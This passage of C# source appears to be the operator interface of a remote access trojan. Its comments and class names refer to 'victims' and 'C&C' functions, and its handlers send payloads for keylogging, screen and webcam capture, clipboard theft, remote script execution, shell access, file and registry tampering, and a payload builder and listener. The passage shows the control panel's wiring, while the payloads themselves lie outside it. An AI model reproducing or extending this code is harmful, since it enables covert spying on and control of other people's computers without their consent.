                    DialogResult dr = MessageBox.Show("This module is installed with pip, remove(uninstall) anyway ?", "pip installed", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

                    if (dr != DialogResult.Yes)
                        continue;
                }

                v.RunPayload("RemotePlugin", v, new string[] { item.Text, type.ToString() });
            }
        }

        void pip_Manager()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                TabPage page = FindTabPage(v, Function.pip_Manager);
                if (page == null)
                {
                    page = new TabPage();
                    ToolStrip ts = new ToolStrip();
                    SplitContainer sc = new SplitContainer();
                    StatusStrip ss = new StatusStrip();
                    ListView lv = new ListView();
                    TextEditorControl editor = new TextEditorControl();

                    ToolStripButton btn1 = new ToolStripButton() { DisplayStyle = ToolStripItemDisplayStyle.Text, Text = "List", };
                    ToolStripButton btn4 = new ToolStripButton() { DisplayStyle = ToolStripItemDisplayStyle.Text, Text = "Find", };
                    ToolStripButton btn2 = new ToolStripButton() { DisplayStyle = ToolStripItemDisplayStyle.Text, Text = "Install", };
                    ToolStripButton btn3 = new ToolStripButton() { DisplayStyle = ToolStripItemDisplayStyle.Text, Text = "Uninstall", };

                    //ADD CONTROLS - PAGE
                    tabControl2.TabPages.Add(page);
                    page.Controls.Add(ts);
                    page.Controls.Add(sc);
                    page.Controls.Add(ss);
                    page.Tag = new object[] { v, Function.pip_Manager };

                    //ADD CONTROLS - SPLIT CONTAINER
                    sc.Panel1.Controls.Add(lv);
                    sc.Panel2.Controls.Add(editor);
                    sc.FixedPanel = FixedPanel.Panel1;
                    sc.SplitterDistance = 300;

                    //TOOL STRIP
                    ts.Dock = DockStyle.Top;
                    ts.Items.AddRange(new ToolStripItem[]
                    {
                        btn1, //LIST INSTALLED PACKAGE
                        btn4, //FIND
                        btn2, //INSTALL
                        btn3, //UNINSTALL
                    });

                    //BUTTON
                    btn1.Click += pipBtn_List;
                    btn4.Click += pipBtn_Find;
                    btn2.Click += pipBtn_Install;
                    btn3.Click += pipBtn_Uninstall;

                    //STATUS STRIP
                    ss.Dock = DockStyle.Bottom;
                    ss.Items.Add(new ToolStripStatusLabel() { Text = "Hello", });

                    //SPLIT CONTAINER
                    sc.Location = new Point(ts.Location.X, ts.Location.Y + ts.Size.Height);
                    sc.Size = new Size(ts.Size.Width, page.Size.Height - ts.Size.Height - ss.Size.Height);
                    sc.Anchor = C1.AnchorStyle_All;
                    sc.SplitterDistance = 300;

                    //TEXT EDITOR
                    editor.Dock = DockStyle.Fill;

                    //LISTVIEW
                    lv.Dock = DockStyle.Fill;
                    lv.View = View.Details;
                    lv.CheckBoxes = true;

                    string[] cols =
                    {
                        "Name",
                        "Version" ,
                    };
                    foreach (string col in cols)
                    {
                        ColumnHeader c = new ColumnHeader();
                        c.Text = col;
                        c.Width = 120;
                        lv.Columns.Add(c);
                    }

                    page.Text = @$"pipManager\\{v.rAddr}";
                }
                tabControl2.SelectedTab = page;

                v.RunPayload("pip_Mgr", v, new string[] { "l" });
            }
        }
        void pip_Install()
        {
            Victim v = GetVictimInCurrentTab();
            var _var = pip_GetControls(v);
            string[] packages = _var.editor.Text.Split(new string[] { Environment.NewLine }, StringSplitOptions.None).ToArray().Where(x => !string.IsNullOrEmpty(x)).ToArray();
            v.RunPayload("pip_Mgr", v, new string[] { "i", string.Join(",", packages.Select(i => C1.B64StrD2Str(i)).ToArray()) });
        }
        void pip_Uninstall()
        {
            Victim v = GetVictimInCurrentTab();
            var _var = pip_GetControls(v);
            string[] packages = _var.lv.CheckedItems.Cast<ListViewItem>().ToArray().Select(x => x.Text).ToArray();
            v.RunPayload("pip_Mgr", v, new string[] { "u", string.Join(",", packages.Select(i => C1.B64StrD2Str(i)).ToArray()) });
        }

        void KeyLogger()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                TabPage page = FindTabPage(v, Function.KeyLogger);

                if (page == null)
                {
                    page = new TabPage();
                    TextEditorControl editor = new TextEditorControl();
                    TextBox tb = new TextBox();

                    tabControl2.TabPages.Add(page);
                    page.Controls.Add(editor);
                    page.Controls.Add(tb);
                    page.Tag = new object[] { v, Function.KeyLogger };

                    tb.Dock = DockStyle.Bottom;

                    editor.Location = new Point(0, 0);
                    editor.Size = new Size(tb.Size.Width, page.Height - tb.Size.Height);
                    editor.Anchor = C1.AnchorStyle_All;

                    page.Text = $@"KeyLogger\\{v.rAddr}";
                }
                tabControl2.SelectedTab = page;

                v.RunPayload("KeyLogger", v);
            }
        }

        void Monitor()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                TabPage page = FindTabPage(v, Function.Monitor);

                if (page == null)
                {
                    page = new TabPage();
                    ToolStrip ts = new ToolStrip();
                    ToolStripButton btn1 = new ToolStripButton(); //START
                    ToolStripButton btn2 = new ToolStripButton(); //STOP
                    ToolStripButton btn3 = new ToolStripButton(); //SCREEN SHOT
                    ToolStripButton btn4 = new ToolStripButton(); //SAVE IMAGE
                    ToolStripButton btn5 = new ToolStripButton(); //SAVE MP4
                    PictureBox pb = new PictureBox();

                    tabControl2.TabPages.Add(page);
                    page.Controls.Add(ts);
                    page.Controls.Add(pb);
                    page.Tag = new object[] { v, Function.Monitor };

                    ts.Dock = DockStyle.Top;

                    ts.Items.AddRange(new ToolStripItem[]
                    {
                        btn1, //START
                        btn2, //STOP
                        btn3, //SCREEN SHOT
                        btn4, //SAVE IMAGE
                        btn5, //SAVE MP4
                    });

                    btn1.Text = "Start";
                    btn2.Text = "Stop";
                    btn3.Text = "Screenshot";
                    btn4.Text = "Save image";
                    btn5.Text = "Save mp4";

                    btn1.Click += mbtn1_start;
                    btn2.Click += mbtn2_stop;
                    btn3.Click += mbtn3_shot;
                    btn4.Click += mbtn4_si;
                    btn5.Click += mbtn5_smp4;

                    pb.Location = new Point(0, ts.Height);
                    pb.Size = new Size(ts.Width, page.Height - ts.Height);
                    pb.Anchor = C1.AnchorStyle_All;
                    pb.SizeMode = PictureBoxSizeMode.Zoom;

                    page.Text = $@"Monitor\\{v.rAddr}";
                }
                tabControl2.SelectedTab = page;
            }
        }

        void WebCam()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                TabPage page = FindTabPage(v, Function.WebCam);
                if (page == null)
                {
                    page = new TabPage();
                    ToolStrip ts = new ToolStrip();
                    ToolStripButton btn1 = new ToolStripButton();
                    ToolStripButton btn2 = new ToolStripButton();
                    ToolStripButton btn3 = new ToolStripButton();
                    ToolStripButton btn4 = new ToolStripButton();
                    ToolStripButton btn5 = new ToolStripButton();
                    PictureBox pb = new PictureBox();

                    tabControl2.TabPages.Add(page);
                    page.Controls.Add(ts);
                    page.Controls.Add(pb);
                    page.Tag = new object[] { v, Function.WebCam };
                    page.Text = $@"WebCam\\{v.rAddr}";

                    btn1.Click += wbtn1_start;
                    btn2.Click += wbtn2_stop;
                    btn3.Click += wbtn3_capture;
                    btn4.Click += wbtn4_si;
                    btn5.Click += wbtn5_smp4;

                    btn1.Text = "Start";
                    btn2.Text = "Stop";
                    btn3.Text = "Capture";
                    btn4.Text = "Save Image";
                    btn5.Text = "Save MP4";

                    pb.SizeMode = PictureBoxSizeMode.Zoom;

                    ts.Dock = DockStyle.Top;
                    ts.Items.AddRange(new ToolStripItem[]
                    {
                        btn1, //START
                        btn2, //STOP
                        btn3, //CAPTURE ONCE
                        btn4, //SAVE IMAGE
                        btn5, //SAVE MP4
                    });

                    pb.Size = new Size(ts.Width, page.Size.Height - ts.Height);
                    pb.Location = new Point(ts.Location.X, ts.Location.Y + ts.Height);
                    pb.Anchor = C1.AnchorStyle_All;
                }

                tabControl2.SelectedTab = page;
            }
        }

        void CB()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                TabPage page = FindTabPage(v, Function.Clipboard);
                if (page == null)
                {
                    page = new TabPage();
                    SplitContainer sc = new SplitContainer();
                    ListView lv = new ListView();
                    ToolStrip ts = new ToolStrip();
                    TextEditorControl editor = new TextEditorControl();
                    ToolStripButton btn1 = new ToolStripButton(); //SET

                    tabControl2.TabPages.Add(page);
                    page.Controls.Add(ts);
                    page.Controls.Add(sc);
                    page.Tag = new object[] { v, Function.Clipboard };
                    page.Text = $@"Clipboard\\{v.rAddr}";

                    ts.Dock = DockStyle.Top;
                    ts.Items.AddRange(new ToolStripItem[]
                    {
                        btn1,
                    });

                    btn1.Text = "Set";
                    btn1.Click += cbtn1_set;

                    sc.Panel1.Controls.Add(lv);
                    sc.Panel2.Controls.Add(editor);
                    sc.FixedPanel = FixedPanel.Panel1;
                    sc.SplitterDistance = 500;
                    sc.Location = new Point(0, ts.Size.Height + 5);
                    sc.Size = new Size(ts.Size.Width, page.Size.Height - ts.Height - 5);
                    sc.Anchor = C1.AnchorStyle_All;

                    lv.View = View.Details;
                    lv.Dock = DockStyle.Fill;
                    lv.Click += cblv_Click;
                    lv.Columns.Add(new ColumnHeader() { Text = "Date", Width = 200 });

                    editor.Dock = DockStyle.Fill;
                }

                tabControl2.SelectedTab = page;
                v.RunPayload("Clipboard", v, new string[] { "i" });
            }
        }

        void EvalScript()
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                TabPage page = FindTabPage(v, Function.EvalScript);
                if (page == null)
                {
                    page = new TabPage();
                    SplitContainer sc1 = new SplitContainer();
                    SplitContainer sc2 = new SplitContainer();
                    RichTextBox output = new RichTextBox();
                    TreeView tv = new TreeView();
                    ToolStrip ts = new ToolStrip();
                    TextEditorControl editor = new TextEditorControl();
                    ToolStripButton btn1 = new ToolStripButton(); //EXECUTE
                    ToolStripButton btn2 = new ToolStripButton(); //SAVE

                    tabControl2.TabPages.Add(page);
                    page.Controls.Add(ts);
                    page.Controls.Add(sc2);
                    page.Tag = new object[] { v, Function.EvalScript };
                    page.Text = $@"EvalScript\\{v.rAddr}";

                    ts.Dock = DockStyle.Top;
                    ts.Items.AddRange(new ToolStripItem[]
                    {
                        btn1, //EXECUTE
                        btn2, //SAVE
                    });

                    btn1.Text = "Execute";
                    btn2.Text = "Save";
                    btn1.Click += esbtn1_execute;
                    btn2.Click += esbtn2_save;

                    sc2.Orientation = Orientation.Horizontal;
                    sc2.SplitterDistance = 300;
                    sc2.FixedPanel = FixedPanel.Panel2;
                    sc2.Panel1.Controls.Add(sc1);
                    sc2.Panel2.Controls.Add(output);
                    sc2.Size = new Size(ts.Size.Width, page.Size.Height - ts.Height - 5);
                    sc2.Anchor = C1.AnchorStyle_All;
                    sc2.Location = new Point(0, ts.Size.Height + 5);

                    output.Dock = DockStyle.Fill;

                    sc1.Panel1.Controls.Add(tv);
                    sc1.Panel2.Controls.Add(editor);
                    sc1.FixedPanel = FixedPanel.Panel1;
                    sc1.SplitterDistance = 500;
                    sc1.Dock = DockStyle.Fill;

                    tv.Dock = DockStyle.Fill;

                    editor.Dock = DockStyle.Fill;
                }

                tabControl2.SelectedTab = page;
            }
        }

        //C&C FUNCTION [END]

        //SETUP FUNCTION
        void setup()
        {
            //DATABASE
            C2.sql_conn = new SQL_Conn();

            //INI MANAGER
            C2.ini_manager = new IniManager("config.ini");

            //STORAGE
            C2.form1 = this;

            //CONSOLE
            TabPage page = new TabPage();
            RichTextBox console = new RichTextBox();
            tabControl3.TabPages.Add(page);
            page.Controls.Add(console);

            console.Dock = DockStyle.Fill;
            console.BackColor = Color.Black;
            console.ForeColor = Color.White;
            console.Font = new Font("NSimSun", 15);
            console.SelectionCharOffset = 2;

            //CONTROLS
            treeView1.ExpandAll();
            TabPageInit();
            C2.il.ImageSize = new Size(20, 20);
            C2.il.Images.Add(imageList1.Images[0]);

            //HIDE TABPAGE
            for (int i = tabControl2.TabCount - 1; i > 0; i--)
            {
                TabPage tab = tabControl2.TabPages[i];
                if (tab.Text.Contains("\\"))
                    tabs.Add(tab);
                else
                    tabs_dict.Add(tab.Text, tab);
                tabControl2.TabPages.Remove(tab);
            }

            //SERVER SETTING
            server = new Listener();
            server.Received += new Listener.ReceivedEventHandler(Received);
            server.Disconnected += new Listener.DisconnectedEventHandler(Disconnect);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            frmListen f_listen = new frmListen();
            f_listen.ShowDialog();
            if (f_listen.DialogResult == DialogResult.OK)
            {
                if (server.is_listen)
                {
                    server.Stop();
                    server = new Listener();
                }

                server.Start(frmListen.ip, frmListen.port);

                ss.IP = frmListen.ip;
                ss.Port = frmListen.port;

                SystemStatus("Listening port : " + frmListen.port.ToString());
            }
            else
            {

            }
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            frmBuild f_build = new frmBuild();
            f_build.ShowDialog();
        }

        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            frmAbout f_about = new frmAbout();
            f_about.Show();
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            ClientDetails();
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            FileManager();
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            Shell();
        }

        private void treeView2_AfterSelect(object sender, TreeViewEventArgs e)
        {

        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {

        }

        private void tabControl2_KeyDown(object sender, KeyEventArgs e)
        {
            TabPage page = tabControl2.SelectedTab;
            if (e.Modifiers == Keys.Control)
            {
                if (e.KeyCode == Keys.W)
                {
                    if (tabControl2.SelectedIndex > 0)
                    {
                        int index = tabControl2.SelectedIndex;
                        tabControl2.TabPages.Remove(page);
                        tabControl2.SelectedIndex = index - 1;
                    }
                }
                else if (e.KeyCode == Keys.S)
                {
                    if (page.Controls.Count < 4)
                        return;

                    Control control = page.Controls[1];
                    if (control is TextEditorControl)
                        WriteFile();
                }
                else if (e.KeyCode == Keys.A)
                {
                    if (page.Tag == null)
                    {
                        if (page == tabControl2.TabPages[0])
                            foreach (ListViewItem item in listView2.Items)
                                item.Selected = true;
                    }
                    else
                    {
                        object[] objs = (object[])page.Tag;
                        Function f = (Function)objs[1];
                        if (f == Function.FileManager)
                        {
                            var _var = file_GetControls();
                            foreach (ListViewItem item in _var.lv.Items)
                                item.Selected = true;
                        }
                    }
                }
                else if (e.KeyCode == Keys.F)
                {
                    object[] objs = (object[])page.Tag;
                    Function f = (Function)objs[1];
                    if (f == Function.FileManager)
                    {
                        frmFileFind f_find = new frmFileFind();
                        f_find.ShowDialog();
                    }
                }
            }
            else if (e.KeyCode == Keys.F5)
            {
                Victim v = GetVictimInCurrentTab();
                if (page == FindTabPage(v, Function.FileManager)) FileListViewRefresh();
                else if (page == FindTabPage(v, Function.RegEdit)) reg_Refresh();
                else if (page == FindTabPage(v, Function.RemotePlugin)) rPlugin_Refresh();
            }
            else if (e.KeyCode == Keys.Delete)
            {
                if (page == FindTabPage(GetVictimInCurrentTab(), Function.FileManager))
                {
                    var _var = file_GetControls();
                    int count = _var.lv.SelectedItems.Count;

                    //CONFIRM
                    DialogResult result = MessageBox.Show($"Are you sure to delete {count} {(count == 1 ? "file" : "files")} ?", "Wait a Second !", MessageBoxButtons.YesNo, MessageBoxIcon.Question); ;
                    if (result == DialogResult.Yes) DeleteFile();
                }
            }
            else if (e.KeyCode == Keys.Enter)
            {
                Control control = GetFocusedControl();
                Victim v = GetVictimInCurrentTab();
                if (page == FindTabPage(v, Function.FileManager))
                {
                    if (control is TextBox)
                    {
                        string path = ((TextBox)control).Text;
                        v.RunPayload("File", v, new string[] { "g", path });
                    }
                }
            }
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            TreeNode node = treeView1.SelectedNode;
            node.SelectedImageKey = node.ImageKey;
        }

        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            FileListViewRefresh();
        }

        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            var _var = file_GetControls();
            TreeView tv = _var.tv;
            TreeNode node = _var.node;
            if (node.Parent != null)
                tv.SelectedNode = node.Parent;
        }

        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            ShowImage();
        }

        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            ReadFileOrOpenDir();
        }

        private void toolStripMenuItem13_Click(object sender, EventArgs e)
        {
            DeleteFile();
        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            UploadFile();
        }

        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            DownloadFile();
        }

        private void Form1_Activated(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem17_Click(object sender, EventArgs e)
        {
            RegEdit();
        }

        private void toolStripMenuItem18_Click(object sender, EventArgs e)
        {
            WMIC();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                Text = $"{title} | Port[{(ss.Port == 0 ? "" : ss.Port)}]";
                tssl_online.Text = $"Online[{listView2.Items.Count}]";

                tssl_upload.Text = $"Upload[{C2.sent}]";
                C2.sent = 0;

                tssl_download.Text = $"Download[{C2.received}]";
                C2.received = 0;
            }
            catch
            {

            }
        }

        private void toolStripMenuItem22_Click(object sender, EventArgs e)
        {
            ProcessManager();
        }

        private void toolStripMenuItem23_Click(object sender, EventArgs e)
        {
            ServiceManager();
        }

        private void toolStripMenuItem29_Click(object sender, EventArgs e)
        {
            ConnectionManager();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            title = Text;
            status_timer.Start();
        }

        private void toolStripMenuItem20_Click(object sender, EventArgs e)
        {
            Archive_Compress();
        }

        private void toolStripMenuItem21_Click(object sender, EventArgs e)
        {
            Archive_Extract();
        }

        private void toolStripMenuItem34_Click(object sender, EventArgs e)
        {
            WGET();
        }

        private void toolStripMenuItem15_Click(object sender, EventArgs e)
        {
            NewEntity();
        }

        private void toolStripMenuItem16_Click(object sender, EventArgs e)
        {
            NewEntity(false);
        }

        private void toolStripMenuItem33_Click(object sender, EventArgs e)
        {
            Exploitation();
        }

        private void splitContainer3_SplitterMoved(object sender, SplitterEventArgs e)
        {

        }

        private void toolStripMenuItem40_Click(object sender, EventArgs e)
        {
            view_All();
        }

        private void toolStripMenuItem41_Click(object sender, EventArgs e)
        {
            view_Target();
        }

        private void toolStripMenuItem42_Click(object sender, EventArgs e)
        {
            view_Status();
        }

        private void toolStripMenuItem38_Click(object sender, EventArgs e)
        {
            PCControl();
        }

        private void toolStripMenuItem39_Click(object sender, EventArgs e)
        {
            ClientConfig();
        }

        private void toolStripMenuItem43_Click(object sender, EventArgs e)
        {
            RemotePlugin();
        }

        private void toolStripMenuItem44_Click(object sender, EventArgs e)
        {
            pip_Manager();
        }

        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            frmSetting f_setting = new frmSetting();
            f_setting.ShowDialog();
        }

        private void toolStripMenuItem27_Click(object sender, EventArgs e)
        {
            reg_Import();
        }

        private void toolStripMenuItem28_Click(object sender, EventArgs e)
        {
            reg_Export();
        }

        private void toolStripMenuItem24_Click(object sender, EventArgs e)
        {
            reg_New();
        }

        private void toolStripMenuItem25_Click(object sender, EventArgs e)
        {
            reg_Edit();
        }

        private void toolStripMenuItem26_Click(object sender, EventArgs e)
        {
            reg_Delete();
        }

        private void toolStripMenuItem45_Click(object sender, EventArgs e)
        {
            KeyLogger();
        }

        private void toolStripMenuItem46_Click(object sender, EventArgs e)
        {
            Monitor();
        }

        private void toolStripMenuItem47_Click(object sender, EventArgs e)
        {
            rPlugin_Refresh();
        }

        private void toolStripMenuItem48_Click(object sender, EventArgs e)
        {
            rPlugin_Load();
        }

        private void toolStripMenuItem49_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem50_Click(object sender, EventArgs e)
        {
            rPlugin_Remove();
        }

        private void tabControl3_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                if (e.KeyCode == Keys.W)
                {
                    TabPage page = tabControl3.SelectedTab;
                    if (page != null) tabControl3.TabPages.Remove(page);
                }
            }
        }

        private void toolStripMenuItem57_Click(object sender, EventArgs e)
        {
            WebCam();
        }

        private void toolStripMenuItem62_Click(object sender, EventArgs e)
        {
            CB();
        }

        private void toolStripMenuItem63_Click(object sender, EventArgs e)
        {
            EvalScript();
        }

        private void toolStripMenuItem64_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "csv files (*.csv)|*.csv";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                var x = serv_GetControls();
                lvExport2CSV(x.lv, sfd.FileName);
            }
        }

        private void toolStripMenuItem66_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                var x = conn_GetControls();
                lvExport2CSV(x.lv, sfd.FileName);
            }
        }

        private void toolStripMenuItem68_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                var x = proc_GetControls();
                lvExport2CSV(x.lv, sfd.FileName);
            }
        }

        private void toolStripMenuItem69_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(proc_GetControls().lv));
        }

        private void toolStripMenuItem70_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(proc_GetControls().lv, new int[] { 0 }));
        }

        private void toolStripMenuItem71_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(proc_GetControls().lv, new int[] { 1 }));
        }

        private void toolStripMenuItem72_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(proc_GetControls().lv, new int[] { 2 }));
        }

        private void toolStripMenuItem73_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(proc_GetControls().lv, new int[] { 1, 2 }));
        }

        private void toolStripMenuItem74_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(serv_GetControls().lv));
        }

        private void toolStripMenuItem75_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(serv_GetControls().lv, new int[] { 0 }));
        }

        private void toolStripMenuItem76_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(serv_GetControls().lv, new int[] { 1 }));
        }

        private void toolStripMenuItem78_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(serv_GetControls().lv, new int[] { 4 }));
        }

        private void toolStripMenuItem77_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(serv_GetControls().lv, new int[] { 0, 1, 4 }));
        }

        private void toolStripMenuItem79_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(conn_GetControls().lv));
        }

        private void toolStripMenuItem80_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(conn_GetControls().lv, new int[] { 1 }));
        }

        private void toolStripMenuItem81_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(conn_GetControls().lv, new int[] { 3 }));
        }

        private void toolStripMenuItem82_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(conn_GetControls().lv, new int[] { 7 }));
        }

        private void toolStripMenuItem83_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(conn_GetControls().lv, new int[][] { new int[] { 1, 2 } }, ":", ""));
        }

        private void toolStripMenuItem84_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(conn_GetControls().lv, new int[][] { new int[] { 3, 4 } }, ":", ""));
        }

        private void toolStripMenuItem85_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(conn_GetControls().lv, new int[][] { new int[] { 1, 2 }, new int[] { 3, 4 } }, ":", "->"));
        }

        private void toolStripMenuItem86_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(conn_GetControls().lv, new int[][] { new int[] { 3, 4 }, new int[] { 7 } }, ":", "|"));
        }

        private void toolStripMenuItem52_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(rPlugin_GetControls(GetVictimInCurrentTab()).lv));
        }

        private void toolStripMenuItem53_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(rPlugin_GetControls(GetVictimInCurrentTab()).lv, new int[] { 0 }));
        }

        private void toolStripMenuItem54_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(rPlugin_GetControls(GetVictimInCurrentTab()).lv, new int[] { 2 }));
        }

        private void toolStripMenuItem55_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(rPlugin_GetControls(GetVictimInCurrentTab()).lv, new int[] { 3 }));
        }

        private void toolStripMenuItem56_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(lvCopy(rPlugin_GetControls(GetVictimInCurrentTab()).lv, new int[] { 5 }));
        }

        private void toolStripMenuItem87_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                lvExport2CSV(rPlugin_GetControls(GetVictimInCurrentTab()).lv, sfd.FileName);
            }
        }

        private void toolStripMenuItem97_Click(object sender, EventArgs e)
        {
            frmProcessFind f = new frmProcessFind();
            f.f1 = this;
            f.v = GetVictimInCurrentTab();
            f.Text = $@"Proc Filter\\{f.v.ID}";
            f.Show();
        }

        private void toolStripMenuItem98_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem100_Click(object sender, EventArgs e)
        {
            frmServFind f = new frmServFind();
            f.f1 = this;
            f.v = GetVictimInCurrentTab();
            f.Text = $@"Serv Filter\\{f.v.ID}";
            f.Show();
        }

        private void toolStripMenuItem101_Click(object sender, EventArgs e)
        {

        }

        private void toolStripMenuItem102_Click(object sender, EventArgs e)
        {
            frmConnFind f = new frmConnFind();
            f.v = GetVictimInCurrentTab();
            f.f1 = this;
            f.Text = $@"Conn Filter\\{f.v.ID}";
            f.Show();
        }

        private void toolStripMenuItem95_Click(object sender, EventArgs e)
        {
            frmConnect f = new frmConnect();
            f.ShowDialog();
        }

        //Socket - Reconnect
        private void toolStripMenuItem104_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                //todo: reconnect victim socket
            }
        }
        //Socket - Disconnect
        private void toolStripMenuItem105_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                Victim v = (Victim)item.Tag;
                //todo: disconnect victim socket
            }
        }
    }
}